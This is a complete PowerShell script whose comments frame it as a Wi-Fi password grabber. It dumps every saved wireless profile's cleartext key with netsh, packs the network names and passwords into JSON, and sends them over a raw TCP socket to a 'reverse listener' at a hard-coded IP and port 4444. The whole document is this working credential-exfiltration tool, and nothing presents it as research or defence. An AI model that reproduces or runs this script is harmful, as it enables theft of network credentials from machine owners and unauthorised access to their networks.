
# Define the target IP and port for the reverse listener
$targetIP = "192.168.0.112"
$targetPort = 4444

# Function to extract Wi-Fi passwords
function Get-WifiPasswords {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Trim().Split(":")[1].Trim() }
    $wifiPasswords = @()

    foreach ($profile in $wifiProfiles) {
        $profileInfo = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
        if ($profileInfo) {
            $password = $profileInfo.ToString().Trim().Split(":")[1].Trim()
            $wifiPasswords += [PSCustomObject]@{
                SSID     = $profile
                Password = $password
            }
        }
    }

    return $wifiPasswords
}

# Get Wi-Fi passwords
$wifiPasswords = Get-WifiPasswords

# Convert the passwords to a JSON string
$jsonPasswords = $wifiPasswords | ConvertTo-Json

# Send the JSON string to the reverse listener
$client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($jsonPasswords)
$writer.Flush()
$writer.Close()
$client.Close()
